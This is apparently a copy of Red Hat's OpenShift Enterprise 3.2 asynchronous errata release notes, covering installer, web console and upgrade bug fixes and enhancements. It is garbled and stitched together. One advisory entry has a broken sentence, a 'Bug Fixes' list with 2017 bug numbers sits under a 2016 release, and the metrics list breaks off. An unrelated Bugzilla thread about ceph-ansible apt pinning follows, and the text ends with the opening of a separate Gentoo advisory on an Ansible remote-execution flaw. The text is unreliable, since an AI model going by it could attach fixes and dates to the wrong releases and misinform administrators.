Life Cycle](https://access.redhat.com/support/policy/updates/openshift) for more information about asynchronous errata.

Red Hat Customer Portal users can enable errata notifications in the account
settings for Red Hat Subscription Management (RHSM). When errata notifications
are enabled, users are notified via email whenever new errata relevant to their
registered systems are released.

|  | Red Hat Customer Portal user accounts must have systems registered and consuming OpenShift Enterprise entitlements for OpenShift Enterprise errata notification emails to generate. |
| --- | --- |

This section will continue to be updated over time to provide notes on
enhancements and bug fixes for future asynchronous errata releases of OpenShift
Enterprise 3.2. Versioned asynchronous releases, for example with the form
OpenShift Enterprise 3.2.z, will be detailed in subsections. In addition,
releases in which the errata text cannot fit in the space provided by the
advisory will be detailed in subsections that follow.

|  | For any release, always review the instructions on [upgrading your OpenShift Enterprise cluster](../install_config/upgrading/index.html#install-config-upgrading-index) properly. |

### RHBA-2016:1208 - atomic-openshift-utils Bug Fix Update

Issued: 2016-06-07

OpenShift Enterprise bug fix advisory
[RHBA-2016:1208](https://access.redhat.com/errata/product/290/ver%3D3.2/rhel---7/x86_64/RHBA-2016%3A1208),
providing updated **atomic-openshift-utils** and **openshift-ansible** packages that
fix several bugs, is now available.

|  | The instructions for applying this update are provided in the [Solution](https://access.redhat.com/errata/product/290/ver%3D3.2/rhel---7/x86_64/RHBA-2016%3A1208) section of the advisory. |
| --- | --- |

Space precluded documenting all of the bug fixes in the advisory. This release
includes the following bug fixes:

[BZ#1331346](https://bugzilla.redhat.com/show_bug.cgi?id=1331346)

The installer’s global proxy configuration support did not correctly configure
the `BuildDefaults` admission controller. The installer has been updated to
properly configure the `BuildDefaults` admission controller.

[BZ#1337438](https://bugzilla.redhat.com/show_bug.cgi?id=1337438)

The installer was incorrectly adding extra single quotes to the
***/etc/sysconfig/docker*** file on each run due to an errant newline in the
Ansible role. This bug fix updates the installer to remove the newline, and as a
result the extra quotes no longer appear.

[BZ#1334187](https://bugzilla.redhat.com/show_bug.cgi?id=1334187)

Due to **docker-1.9.1-40** packaging changes, it is no longer possible to use `yum
downgrade` to downgrade from **docker-1.9.1** to **docker-1.8.2** as required for
OpenShift Enterprise 3.1 and 3.0 installations. The installer has been updated
to use `yum swap` to perform this downgrade when necessary.

[BZ#1336780](https://bugzilla.redhat.com/show_bug.cgi?id=1336780)

Due to packaging changes in **docker-1.9.1-40**, containerized nodes did not have
the correct Docker components mounted from the host into the node container.
This prevented pods from being correctly configured to use the SDN. The missing
components have been added to the containerized node configuration.

[BZ#1330934](https://bugzilla.redhat.com/show_bug.cgi?id=1330934)

The installer did not properly convert the `openshift_generate_no_proxy_hosts`
Ansible variable to a boolean so it may have been ignored. This bug fix updates
the installer and the `openshift_generate_no_proxy_hosts` variable is now
properly converted into a boolean ensuring that this variable produces the
desired effect.

[BZ#1330935](https://bugzilla.redhat.com/show_bug.cgi?id=1330935)

Containerized installations of OpenShift Enterprise (OSE) 3.1 were incorrectly
receiving configuration defaults intended only to be used with OSE 3.2
installations. This meant that **dnsmasq** was configured for OSE 3.1 installs
when it should not have been. This bug fix updates the fixed containerized
version detection so that the correct default configurations are applied to OSE
3.1 installations. This means **dnsmasq** will no longer be included by default on
OSE 3.1 containerized installations. This bug only affected containerized
installations.

[BZ#1331097](https://bugzilla.redhat.com/show_bug.cgi?id=1331097)

Previously under certain configurations, running the ***config.yml*** playbook
could fully upgrade a containerized OpenShift Enterprise environment to the
latest available image versions in configured registries. This bug fix updates
the ***config.yml*** playbook to ensure images are not updated in these scenarios,
and as a result the playbook can be run safely without inadvertently upgrading
images to a newer version.

[BZ#1331365](https://bugzilla.redhat.com/show_bug.cgi?id=1331365)

The quick installer has been updated to help make proxy-related questions more
clear as to what information is being requested.

[BZ#1331239](https://bugzilla.redhat.com/show_bug.cgi?id=1331239)

The quick installer incorrectly prompted for global proxy configuration settings
when installing OpenShift Enterprise (OSE) 3.1. The installer has been updated
to no longer prompt for global proxy settings in OSE 3.0 and 3.1 installations
because this feature requires OSE 3.2.

[BZ#1331236](https://bugzilla.redhat.com/show_bug.cgi?id=1331236)

Proxy variables previously were not written correctly to Ansible inventories by
the quick installer. This bug fix updates the quick installer to ensure the
`openshift_http_proxy`, `openshift_https_proxy`, `openshift_no_proxy`
variables are written to inventories.

[BZ#1334895](https://bugzilla.redhat.com/show_bug.cgi?id=1334895)

The NetworkManager dispatcher script which configures **dnsmasq** in OpenShift
Enterprise 3.2 did not account for static network configurations. The dispatcher
script has been updated to work for static network configurations.

[BZ#1330920](https://bugzilla.redhat.com/show_bug.cgi?id=1330920)

The example Ansible inventories used the incorrect syntax for the
`openshift_generate_no_proxy_hosts` variable. If administrators had copied and
pasted the example syntax, it would not have taken effect. This bug fix updates
the example inventories with the correct syntax for setting this variable.

[BZ#1335063](https://bugzilla.redhat.com/show_bug.cgi?id=1335063)

The installer’s global proxy configuration incorrectly quoted values in the
master’s ***sysconfig*** files. This meant that containerized installs using proxy
configurations created by the installer would have failed. The installer has
been updated to use proper quoting syntax.

[BZ#1337425](https://bugzilla.redhat.com/show_bug.cgi?id=1337425)

The installer uses the `repoquery` command, which is provided by the **yum-utils**
package and is not in Minimal installations of Red Hat Enterprise Linux 7.x.
Ansible 1.9 installed this package before calling the command, but it is no
longer installed starting with Ansible 2.0. This bug fix updates the installer
to check that the **yum-utils** package is installed, and attempts to install it
if it is not.

[BZ#1334639](https://bugzilla.redhat.com/show_bug.cgi?id=1334639)

When configuring Ansible variables in inventories using raw booleans,
installations could fail due to broken master configurations. This bug fix
updates the installer to ensure that these values are properly converted to the
master configuration files.

[BZ#1334148](https://bugzilla.redhat.com/show_bug.cgi?id=1334148)

The default for the `openshift_docker_hosted_registry_insecure` Ansible
variable is `true` but if it was set explicitly to `true` in an inventory, the
installation would product an error. Setting the variable to `false` caused it
to be ignored. This bug fix updates the installer to respect explicitly setting
this value.

[BZ#1329496](https://bugzilla.redhat.com/show_bug.cgi?id=1329496)

Previously, the `osm_default_subdomain` Ansible variable did not take effect when
set. This was due to a backwards compatibility issue in the installer. This bug
fix updates the installer to once again respect setting this variable.

[BZ#1326045](https://bugzilla.redhat.com/show_bug.cgi?id=1326045)

The legacy `cli_docker_options` and `cli_docker_log_options` Ansible
variables were not working due to use of an outdated host group that was since
refactored. The variables were supposed to be migrated to the new format, using
the `openshift_docker_options` and `openshift_docker_log_options` variables,
respectively. This bug fix updates the installer so that the legacy variables
can be used again.

[BZ#1326642](https://bugzilla.redhat.com/show_bug.cgi?id=1326642)

During an upgrade, if the `openshift_image_tag` Ansible variable was set in an
inventory to an image version that was older than the latest available, the
latest available version was still set in the **systemd** unit files. This bug fix
updates the installer to ensure the version set by `openshift_image_tag` is
what actually gets set in the **systemd** unit files.

[BZ#1336202](https://bugzilla.redhat.com/show_bug.cgi?id=1336202)

Upgrades from OpenShift Enterprise (OSE) 3.1 to 3.2 on RPM-based installations
incorrectly attempted to pull the **openshift3/ose:latest** image. This step is
only required for containerized installations and has been removed from
RPM-based installations, eliminating the need to pull an unexpected image.

[BZ#1331389](https://bugzilla.redhat.com/show_bug.cgi?id=1331389)

Previously, the `cli_docker_additional_registries` Ansible variable did not
take effect during an upgrade. This was due to legacy options (`cli_*`) not
being migrated during upgrades. This bug fix updates the installer to migrate
these options correctly.

### RHBA-2016:1343 - OpenShift Enterprise 3.2.1.1 bug fix and enhancement update

Issued: 2016-06-27

OpenShift Enterprise release 3.2.1.1
([RHBA-2016:1343](https://access.redhat.com/errata/product/290/ver%3D3.1/rhel---7/x86_64/RHBA-2016%3A1343))
is now available.

See the following sections for notes on upgrading and details on the
enhancements, bug fixes, and known issues included in this release.

#### Upgrading

Currently, you must use the
[manual cluster upgrade
steps](../install_config/upgrading/manual_upgrades.html#install-config-upgrading-manual-upgrades) to apply this asynchronous errata update from OpenShift Enterprise 3.2.0 to
3.2.1.1. An automated playbook for this minor upgrade path is in development,
and the upgrade documentation will be updated with instructions when it is
available.

However, if you are upgrading from OpenShift Enterprise 3.1, you can use the
***v3\_1\_to\_v3\_2*** upgrade playbook as described in the
[Upgrading
to OpenShift Enterprise 3.2](../install_config/upgrading/automated_upgrades.html#upgrading-to-openshift-enterprise-3-2) automated cluster upgrade steps to upgrade all the
way to the latest asynchronous release at once.

#### Enhancements

Docker 1.10 Now Supported

Red Hat Enterprise Linux (RHEL) 7 Server and RHEL Atomic 7.2.5 ship Docker 1.10.
OpenShift Enterprise 3.2 supported Docker 1.9.1 at its general availability release,
and starting with OpenShift Enterprise 3.2.1 now supports Docker 1.10 as well.
OpenShift Enterprise 3.2.1 also still supports Docker 1.9.1. If any images exist on a
host when Docker is started after upgrading to 1.10, a lengthy upgrade process
is triggered automatically for the remaining images. As such, Red Hat recommends
removing all images before upgrading to Docker 1.10; this step is detailed in
the upgrade documentation.

|  | See [Known Issues](#ose-3-2-1-1-known-issues) for more details on using OpenShift Enterprise and Docker 1.10. |
| --- | --- |

#### Bug Fixes

[**BZ#1324179**](https://bugzilla.redhat.com/show_bug.cgi?id=1324179)

Creation of the `builder` and `deployer` service accounts could be delayed for
newly-created projects, during which time users could not build or deploy
applications. This was caused by an issue when project templates defined a quota
for secrets. This bug fix ensures that service accounts and their tokens are
created quickly in this scenario (within seconds), and as a result users do not
have to wait after project creation to build or deploy applications.

[**BZ#1327500**](https://bugzilla.redhat.com/show_bug.cgi?id=1327500)

Pod and build names allow for up to 256 characters, however label values cannot
be more than 64 characters. This caused builds to fail for build configurations
with names longer than 64 characters, due to the invalid length set for the
build pod’s label. This bug fix truncates the value of build pod labels to 64
chars and relies on the build annotation to get the full name. As a result,
builds no longer fail in this scenario.

[**BZ#1334249**](https://bugzilla.redhat.com/show_bug.cgi?id=1334249)

When attempting to run a PostgreSQL slave pod from the upstream replica
template, the pod could get stuck in CrashLoopBackOff status, citing a
"MEMORY\_LIMIT\_IN\_BYTES: unbound variable" error. This bug fix ensures that
cgroup limits are properly handled for such pods, and as a result this issue no
longer occurs.

[**BZ#1333122**](https://bugzilla.redhat.com/show_bug.cgi?id=1333122)

Events related to quota failures for compute resources produced multiple
identical events. This was due to errors describing why a request was rejected
having a variable ordering of responses for the same root cause. This bug fix
sorts resources in quota errors, and as a result duplicate events are avoided.

[**BZ#1334501**](https://bugzilla.redhat.com/show_bug.cgi?id=1334501)

Previously when etcd watch cache was enabled, the API server would deliver a 410
HTTP response when a watch was attempted with a resourceVersion that was too
old. The expected result was a 200 HTTP status, with a single watch event of
type ERROR. This bug fix updates the API server to produce the same results in
this case, regardless of whether watch cache is enabled. The "410 Gone" error is
now returned as a watch error event, rather than as a HTTP 410 response.

[**BZ#1333172**](https://bugzilla.redhat.com/show_bug.cgi?id=1333172)

Previously in the web console, it was difficult to tell the difference between
links to route host names linking to actual running applications versus
navigation links within the console. This was particularly difficult on the
Browse page for a route. This bug fix updates the web console so that route host
names are displayed with its entire web URL (protocol included), making it more
obvious that it is a link to the host name.

[**BZ#1333898**](https://bugzilla.redhat.com/show_bug.cgi?id=1333898)

If a project had a large number of builds, and then many were deleted, the graph
in the web console showing the builds could become truncated and display poorly.
This bug fix updates the web console to avoid this issue.

[**BZ#1334485**](https://bugzilla.redhat.com/show_bug.cgi?id=1334485)

When a project had no services but had a deployment configuration with no
deployments, the empty Overview page in the web console displayed a "No services
to show" message. This bug fix updates the message to more specifically read
"There are no services and no running deployments or pods."

[**BZ#1333003**](https://bugzilla.redhat.com/show_bug.cgi?id=1333003)

Previously, information on downloading and logging in to the CLI tool was shown
on the **About** page in the web console, linked from the **?** drop-down menu in
the top navigation. This bug fix updates the web console to include a separate
**Command Line Tools** page in this drop-down menu so that it is more obvious at a
glance. A link has also been added to the new page from the **About** page.

[**BZ#1333118**](https://bugzilla.redhat.com/show_bug.cgi?id=1333118)

When adding environment variable or label name-value pairs in the web console
via **Add to Project**, it was previously unclear whether it required clicking the
**Add** button to actually the commit the changes before hitting **Create** at the
bottom of the page. This bug fix updates the web console to disable the **Create**
button while uncommitted name-value pairs are entered. A "Please add or clear
this name-value pair" message is also displayed until the pair has been added or
cleared.

[**BZ#1331816**](https://bugzilla.redhat.com/show_bug.cgi?id=1331816)

The web console has been updated to more accurately reflect memory limit values.

[**BZ#1333158**](https://bugzilla.redhat.com/show_bug.cgi?id=1333158)

When scaling deployments in the web console, if multiple scaling requests were
made in a short amount of time, it was possible for the operation to result with
an incorrect number of replicas. This bug fix addresses a timing issue, and as a
result the correct number of replicas are now set in this scenario.

[**BZ#1333590**](https://bugzilla.redhat.com/show_bug.cgi?id=1333590)

Previously, template descriptions in the web console were collapsed into a
single line and truncated with no way to expand. Because the description could
contain important information or warnings, this bug fix updates the web console
to now display the full text, split into multiple lines if needed.

[**BZ#1333163**](https://bugzilla.redhat.com/show_bug.cgi?id=1333163)

When editing a YAML object in the web console, pressing CTRL+F or CMD+F to
attempt to search the text did not appear to do anything. This bug fix updates
the web console so that doing so causes a search box to appear in the UI, as
expected.

[**BZ#1336526**](https://bugzilla.redhat.com/show_bug.cgi?id=1336526)

The Documentation link in the **?** drop-down menu was hard-coded instead of using
the method described in
[Customizing
the Web Console](../install_config/web_console_customization.html#changing-links-to-documentation). This bug fix updates the web console, and now this link can be
customized as expected.

[**BZ#1322271**](https://bugzilla.redhat.com/show_bug.cgi?id=1322271)

In previous releases, network metrics were not included when cluster metrics
were enabled. This bug fix allows for network metrics to now be shown via REST
API.

[**BZ#1340324**](https://bugzilla.redhat.com/show_bug.cgi?id=1340324)

Due to newer releases of docker changing the path of the docker executable,
containerized nodes could fail to initialize the SDN because they cannot execute
docker properly. This bug fix updates the containerized node image to
accommodate this change, and as a result containerized nodes work properly with
current and future versions of docker.

[**BZ#1334866**](https://bugzilla.redhat.com/show_bug.cgi?id=1334866)

Previously, it was possible to set the `metadata.deletionTimestamp` parameter
during the update of an object. However, `deletionTimestamp` and
`deletionGracePeriodSeconds` fields should only be able to be set as a result
of a delete API operation. This bug fix ensures that the parameter cannot be set
during update, and any attempts now produce a "field is immutable; may only be
changed via deletion" error.

[**BZ#1333932**](https://bugzilla.redhat.com/show_bug.cgi?id=1333932)

The etcd watch cache was enabled in a previous release for Kubernetes resource
types. This bug fix enables the etcd watch cache for all OpenShift resource
types, as well.

[**BZ#1326523**](https://bugzilla.redhat.com/show_bug.cgi?id=1326523)

This bug fix adds the `MYSQL_MAX_ALLOWED_PACKET` environment variable to the
MySQL image, for setting the maximum size of one packet or any generated or
intermediate string (default: 200M).

[**BZ#1320233**](https://bugzilla.redhat.com/show_bug.cgi?id=1320233)

When the default HAProxy router reloaded its configuration during a resync
(default interval: 10 minutes), it was possible to experience dropped
connections to routes. This bug fix updates the **openshift3/ose-haproxy-router**
image to suppress reloads during sync events, and as a result the HAProxy router
no longer reloads periodically and connections to routes are no longer
interrupted for this reason.

#### Known Issues

* **Registry pushes using AWS S3 storage considerably slower with Docker 1.10**:

  When pushing a local image to clusters using the registry with Amazon Simple
  Storage Service (S3) storage back end from the Amazon Web Services platform, the
  push takes considerably more time when using Docker 1.10 than Docker 1.9 when
  the Docker registry is version 2.2.x or earlier. OpenShift Enterprise 3.2 currently
  ships Docker registry 2.2.1. If you are using S3 storage with your registry, it
  is recommended that you do not upgrade to Docker 1.10 and OpenShift Enterprise 3.2.1
  at this time, until a subsequent OpenShift Enterprise update is released that
  addresses the issue.
  ([**BZ#1347022**](https://bugzilla.redhat.com/show_bug.cgi?id=1347022))
* **Images from Docker Hub fail due to v2 image schema:**

  [Docker Hub](https://hub.docker.com/) recently switched to only supporting v2
  image schema, and Docker 1.10 defaults to converting to and using v2 schema when
  pushing and pulling images. OpenShift Enterprise 3.2 currently ships Docker registry
  2.2.1, which does not support the v2 schema (none of the images provided in the
  Red Hat Registry at
  [registry.access.redhat.com](https://registry.access.redhat.com) are
  currently v2 schema). If any image with v2 schema is introduced to the cluster,
  for example during an interaction with images from Docker Hub, Docker operations
  will fail. The issue exists for Docker 1.9 as well specifically as it relates to
  Docker Hub interactions. If you expect Docker Hub images to be used in your
  environment, it is recommended that you do not upgrade to Docker 1.10 at this
  time, until a subsequent OpenShift Enterprise update is released that addresses the
  issue.

### RHBA-2016:1383 - OpenShift Enterprise 3.2.1.4 bug fix and enhancement update

Issued: 2016-07-05

OpenShift Enterprise release 3.2.1.4
([RHBA-2016:1383](https://access.redhat.com/errata/product/290/ver%3D3.1/rhel---7/x86_64/RHBA-2016%3A1383))

[Description](https://access.redhat.com/errata/product/290/ver%3D3.2/rhel---7/x86_64/RHBA-2016%3A1383)
section of the advisory.

#### Upgrading

At the initial release of OpenShift Enterprise 3.2.1.4, only the
[manual
cluster upgrade steps](../install_config/upgrading/manual_upgrades.html#install-config-upgrading-manual-upgrades) were available for applying this asynchronous errata
update from OpenShift Enterprise 3.2.x to 3.2.1.4. An automated playbook for this
minor upgrade path was still in development at the time, which has now been
released as of [OpenShift Enterprise 3.2.1.9](#ose-3-2-1-9).

If you are upgrading from OpenShift Enterprise 3.1, you can use the ***v3\_2*** upgrade
playbook (previously located in a ***v3\_1\_to\_v3\_2*** directory) as described in
the
[Upgrading
to OpenShift Enterprise 3.2](../install_config/upgrading/automated_upgrades.html#upgrading-to-openshift-enterprise-3-2) automated cluster upgrade steps to upgrade all the
way to the latest asynchronous release at once.

### RHBA-2016:1466 - OpenShift Enterprise 3.2.1.9 security and bug fix update

Issued: 2016-07-20

OpenShift Enterprise release 3.2.1.9
([RHBA-2016:1466](https://access.redhat.com/errata/product/290/ver%3D3.2/rhel---7/x86_64/RHBA-2016%3A1466))
is now available. The list of security and bug fixes included in the update are documented in

[Description](https://access.redhat.com/errata/product/290/ver%3D3.2/rhel---7/x86_64/RHBA-2016%3A1466)
section of the advisory.

#### Upgrading

With the release of OpenShift Enterprise 3.2.1.9, an
[automated
upgrade playbook](../install_config/upgrading/automated_upgrades.html#upgrading-to-openshift-enterprise-3-2-asynchronous-releases) is now available and supported for applying asynchronous
errata updates within the OpenShift Enterprise 3.2 minor version (e.g., 3.2.1.4 to
3.2.1.9). See
[Upgrading
to OpenShift Enterprise 3.2 Asynchronous Releases](../install_config/upgrading/automated_upgrades.html#upgrading-to-openshift-enterprise-3-2-asynchronous-releases) for instructions.

If you are upgrading from OpenShift Enterprise 3.1, you can use the ***v3\_2*** upgrade
playbook (previously located in a ***v3\_1\_to\_v3\_2*** directory) as described in
the
[Upgrading
to OpenShift Enterprise 3.2](../install_config/upgrading/automated_upgrades.html#upgrading-to-openshift-enterprise-3-2) automated cluster upgrade steps to upgrade all the
way to the latest asynchronous release at once.

### RHBA-2016:1639 - atomic-openshift-utils Bug Fix and Enhancement Update

Issued: 2016-08-18

OpenShift Enterprise bug fix advisory
[RHBA-2016:1639](https://access.redhat.com/errata/product/290/ver%3D3.2/rhel---7/x86_64/RHBA-2016%3A1639),
providing updated **atomic-openshift-utils** and **openshift-ansible** packages that
fix several bugs and add enhancements, is now available.

Space precluded documenting all of the bug fixes and enhancement in the
advisory. See the following sections for notes on upgrading and details on the
enhancements and bug fixes included in this release.

#### Upgrading

To apply this update, run the following on all hosts where you intend to
initiate Ansible-based installation or upgrade procedures:

```
# yum update atomic-openshift-utils
```

To update the default image streams to include the .NET Core S2I image, see
[Updating
the Default Image Streams and Templates](../install_config/upgrading/manual_upgrades.html#updating-the-default-image-streams-and-templates).

#### Enhancements

Image Streams for .NET Core S2I Image

Image stream definitions for the .NET Core on RHEL S2I image are now added
during OpenShift Enterprise 3.2 installations. ([**BZ#1365285**](https://bugzilla.redhat.com/show_bug.cgi?id=1365285))

Ansible 2.x Now Required

The OpenShift Enterprise 3.2 playbooks now require Ansible 2.x. ([**BZ#1359236**](https://bugzilla.redhat.com/show_bug.cgi?id=1359236))

Named CA Certificates

Administrators can now add the CA for named certificates to the generated CA
using the `cafile` option with the `openshift_master_named_certificates`
Ansible variable. For example:

```
openshift_master_named_certificates=[{"certfile": "/path/to/custom1.crt", "keyfile": "/path/to/custom1.key","cafile": "/path/to/ca.crt"}]
```

([**BZ#1360754**](https://bugzilla.redhat.com/show_bug.cgi?id=1360754))

Backup and Redeploy Cluster Certificates

Administrators can now backup and redeploy cluster certificates using the
following Ansible playbook:

```
$ ansible-playbook -i <inventory_file> \
    /usr/share/ansible/openshift-ansible/playbooks/byo/openshift-cluster/redeploy-certificates.yml
```

By default, the playbook retains the current OpenShift Enterprise CA. To replace
the CA with a generated or custom CA:

```
$ ansible-playbook -i <inventory_file> \
    /usr/share/ansible/openshift-ansible/playbooks/byo/openshift-cluster/redeploy-certificates.yml \
    --extra-vars "openshift_certificates_redeploy_ca=true"
```

([**BZ#1275648**](https://bugzilla.redhat.com/show_bug.cgi?id=1275648))

#### Bug Fixes

[**BZ#1365379**](https://bugzilla.redhat.com/show_bug.cgi?id=1365379)

The installer now enables the `NoVolumeZoneConflict` scheduler policy by
default. This policy restricts that with pods with persistent volumes (PVs) be
scheduled in the availability zone where its PV is located.

[**BZ#1329455**](https://bugzilla.redhat.com/show_bug.cgi?id=1329455)

Previously, the quick installer had issues adding new nodes to existing clusters
in certain configurations. This bug fix updates the installer to properly
identify these configurations and allow new nodes to be added as expected.

[**BZ#1356463**](https://bugzilla.redhat.com/show_bug.cgi?id=1356463)

If Docker 1.8.2 is installed on a host before starting an OpenShift Enterprise
3.2 installation, Ansible now reports the following message: "Cannot upgrade
Docker to greater than or equal to 1.10, please upgrade or remove Docker
manually, or use the Docker upgrade playbook if OpenShift is already installed."

[**BZ#1316378**](https://bugzilla.redhat.com/show_bug.cgi?id=1316378)

Previously when attempting to perform an initial installation on all new hosts,
the quick installer incorrectly detected an "Installed environment" if a
stand-alone load balancer host was included. This bug fix updates the installer
to properly identify these configurations and allow the installation to continue
as expected.

[**BZ#1357801**](https://bugzilla.redhat.com/show_bug.cgi?id=1357801)

Previously, the installer failed when defining customized router certificate
files using the `openshift_hosted_router_certificate` Ansible variable. This
bug fix ensures that the certificate contents are properly checked when using
this variable, and as a result this issue no longer occurs.

[**BZ#1358101**](https://bugzilla.redhat.com/show_bug.cgi?id=1358101)

The installation options for OpenShift Enterprise 3.1, OpenShift Enterprise 3.0,
and Atomic Enterprise Platform have been removed from the OpenShift Enterprise
3.2 version of the quick installer. To install OpenShift Enterprise 3.1 or 3.0,
use the **atomic-openshift-utils** package from the respective product version’s
repository.

[**BZ#1358723**](https://bugzilla.redhat.com/show_bug.cgi?id=1358723)

Previously, the installer failed when using the
`openshift_hosted_router_replicas` Ansible variable. This bug fix ensures that
the number of router replicas can be set using this variable, and as a result
this issue no longer occurs.

[**BZ#1357751**](https://bugzilla.redhat.com/show_bug.cgi?id=1357751)

A section of the upgrade process was incorrectly running on RHEL Atomic Host
systems during upgrades, which would fail due to a missing `repoquery` command.
This bug fix modifies the upgrade process to skip this section that attempts to
upgrade Docker, as this is not possible on RHEL Atomic Host. As a result,
upgrades now complete successfully on RHEL Atomic Host systems.

#### Bug Fixes

[**BZ#1412830**](https://bugzilla.redhat.com/show_bug.cgi?id=1412830)

The extended certificate validation code (now enabled by default) would not allow some certificates that should be considered valid. This caused self-signed, expired, or not yet current certificates that were otherwise well-formed to be rejected. This bug fix changes the extended validation to allow those cases. As a result, those types of certificates are now allowed.

[**BZ#1404106**](https://bugzilla.redhat.com/show_bug.cgi?id=1404106)

The **atomic-openshift-excluder** and **atomic-openshift-docker-excluder** packages did not properly configure yum to exclude the relevant packages. The excluder scripts have been updated to ensure the proper yum configuration is modified ensuring that the appropriate packages are excluded from yum operations.

### RHSA-2017:0448 - ansible and openshift-ansible Security and Bug Fix Update

Issued: 2017-03-06

OpenShift Enterprise security and bug fix advisory
[RHSA-2017:0448](https://access.redhat.com/errata/RHSA-2017%3A0448), providing
updated **atomic-openshift-utils**, **ansible**, and **openshift-ansible** packages
that fix several bugs and a security issue, is now available.

The security issue is documented in the advisory. However, space precluded
documenting all of the non-security bug fixes for this release in the advisory.
See the following sections for notes on upgrading and details on the bug fixes
included in this release.

#### Upgrading

To apply this update, run the following on all hosts where you intend to
initiate Ansible-based installation or upgrade procedures:

```
# yum update atomic-openshift-utils
```

#### Bug Fixes

This release fixes bugs for the following components:

**Installer**

* A change in Ansible 2.2.1.0 caused problems with the OpenShift Enterprise 3.2 plabooks. This bug fix works around the change. ensuring that playbooks run correctly on Ansible 2.2.1.0 and newer. ([**BZ#1419533**](https://bugzilla.redhat.com/show_bug.cgi?id=1419533))
* An Ansible 2.2.1.0 compatibility issue has been fixed in the quick installer. ([**BZ#1421059**](https://bugzilla.redhat.com/show_bug.cgi?id=1421059))
* When executing the installer on a remote host that is also included in the inventory, the firewall configuration could potentially cause the installer to hang. A 10 second delay has been added after reseting the firewall to avoid this problem from occurring. ([**BZ#1379189**](https://bugzilla.redhat.com/show_bug.cgi?id=1379189))
* Network Manager previously reset the `net.ipv4.ip_forward` parameter, causing OpenShift Enterprise to lose certain functionality. This bug fix ensures the installer sets the `sysctl` parameter on the system level, and as a result Network Manager restarts no longer interfere with the installation process. ([**BZ#1415067**](https://bugzilla.redhat.com/show_bug.cgi?id=1415067))
* A [certificate expiry checker](../install_config/redeploying_certificates.html#install-config-cert-expiry) has been added to the installer tools. ([**BZ#1417680**](https://bugzilla.redhat.com/show_bug.cgi?id=1417680))

##### Metrics

* The Heapster password was being set via a property value, so the password could be leaked by processes such as `ps`. This bug fix ensures the password is now being set via a system property. As a result, the password is no longer leaked by such processes. [(**BZ#1427544**)](https://bugzilla.redhat.com/show_bug.cgi?id=1427544)
* The passwords for Hawkular Metrics were being set via a property value, so the passwords could be leaked by processes such as `ps`.

### RHBA-2017:1666 - atomic-openshift-utils Bug Fix and Enhancement Update

Issued: 2017-06-29

OpenShift Enterprise bug fix and enhancement advisory
[RHBA-2017:1666](https://access.redhat.com/errata/RHBA-2017%3A1666), providing
updated **atomic-openshift-utils** and **openshift-ansible** packages that fix
several bugs and add an enhancement, is now available.

Space precluded documenting all of the bug fixes and enhancements for this
release in the advisory. See the following sections for notes on upgrading and
details on the bug fixes and enhancements included in this release.

#### Upgrading

To apply this update, run the following on all hosts where you intend to
initiate Ansible-based installation or upgrade procedures:

```
# yum update atomic-openshift-utils
```

#### Bug Fixes

* Previously, installation would fail in multi-master environments in which the load balanced API was listening on a different port than that of the OpenShift Enterprise API and web console. This bug fix accounts for this difference and ensures the master loopback client configuration is configured to interact with the local master. ([**BZ#1462283**](https://bugzilla.redhat.com/show_bug.cgi?id=1462283))
* During certificate expiration checking or redeployment, certificiates with large serial numbers could not be parsed using the existing manual parser workaround on hosts that were missing the OpenSSL python library. This bug fix updates the manual parser to account for the format of certificates with large serial numbers. As a result, these certificates can now be parsed. ([**BZ#1464546**](https://bugzilla.redhat.com/show_bug.cgi?id=1464546))
* The OpenShift CA redeployment playbook (***playbooks/byo/openshift-cluster/redeploy-openshift-ca.yml***) would fail to restart services if certificates were previously expired. This bug fix ensures that service restarts are now skipped within the OpenShift CA redeployment playbook when expired certificates are detected. Expired cluster certificates may be replaced with the certificate redeployment playbook (***playbooks/byo/openshift-cluster/redeploy-certificates.yml***) after the OpenShift CA certificate has been replaced via the OpenShift CA redeployment playbook. ([**BZ#1460972**](https://bugzilla.redhat.com/show_bug.cgi?id=1460972))
* If etcd 3.x or later was running on the host, a v3 snapshot database must be backed up as part of the backup process. If this directory is not included in the backup, then etcd failed to restore the backup even though v3 data was not used. This bug fix amends the etcd backup steps to ensure that the v3 snapshot database is included in backups. ([**BZ#1440303**](https://bugzilla.redhat.com/show_bug.cgi?id=1440303))

#### Enhancements

* Previously, it was only possible to redeploy the etcd CA certificate by also redeploying the OpenShift CA certificate, which was unnecessary maintenance. With this enhancement, the etcd CA certificate may now be replaced independent of the OpenShift CA certificate using the etcd CA certificate redeployment playbook (***playbooks/byo/openshift-cluster/redeploy-etcd-ca.yml***). Note that the OpenShift CA redeployment playbook (***playbooks/byo/openshift-cluster/redeploy-openshift-ca.yml***) now only replaces the OpenShift CA certificate. Similarly, the etcd CA redeployment playbook only redeploys the etcd CA certificate. ([**BZ#1463775**](https://bugzilla.redhat.com/show_bug.cgi?id=1463775))

| [Description](show_bug.cgi?id=1404515#c0)  Ken Dreyer (Red Hat)    2016-12-14 01:24:21 UTC  ``` Description of problem: When installing Ceph on Ubuntu with ceph-ansible, we are trusting that our package versions in Red Hat Ceph Storage will always be newer than the packages in Ubuntu itself.  The implication here is that if the Ubuntu maintainer ever ships a newer package than what we ship, then Ubuntu's package will override ours.  With ceph-deploy and ice-setup, we used to use apt pinning to make Ubuntu nodes prefer Red Hat's packages. We need ceph-ansible to do the same.  Version-Release number of selected component (if applicable): all versions of ceph-ansible prior to 2.1  How reproducible: always  Steps to Reproduce: 1. Use ceph-ansible to set up a cluster 2. Look in /etc/apt/preferences.d on each cluster node  Actual results: No Red Hat pref file exists  Expected results: An rhcs.pref file exists, and "ceph --version" prints something with "redhat" in it.   ```  [Comment 2](show_bug.cgi?id=1404515#c2)  Ken Dreyer (Red Hat)    2016-12-14 01:24:46 UTC  ``` reported upstream @ <https://github.com/ceph/ceph-ansible/issues/1182>   ```  [Comment 3](show_bug.cgi?id=1404515#c3)  seb    2016-12-14 17:17:48 UTC  ``` upstream PR: <https://github.com/ceph/ceph-ansible/pull/1186>   ```  [Comment 5](show_bug.cgi?id=1404515#c5)  Tejas    2017-02-07 03:46:16 UTC  ``` Verified on build: ceph-ansible-2.1.6-1.el7scon.noarch  Tested 2 cases where the RHEL packages are ahead of ubuntu packages and lagging behind the ubuntu packges.

# Ansible: Remote execution of arbitrary code — GLSA **201701-77**

A vulnerability in Ansible may allow rogue clients to execute
commands on the Ansible controller.

### Affected packages

| Package | **app-admin/ansible** on all architectures |
| --- | --- |
| Affected versions | < **2.1.4.0\_rc3**< **2.2.1.0\_rc5** |
| Unaffected versions | >= **2.1.4.0\_rc3**>= **2.2.1.0\_rc5** |

### Background

Ansible is a radically simple IT automation platform.

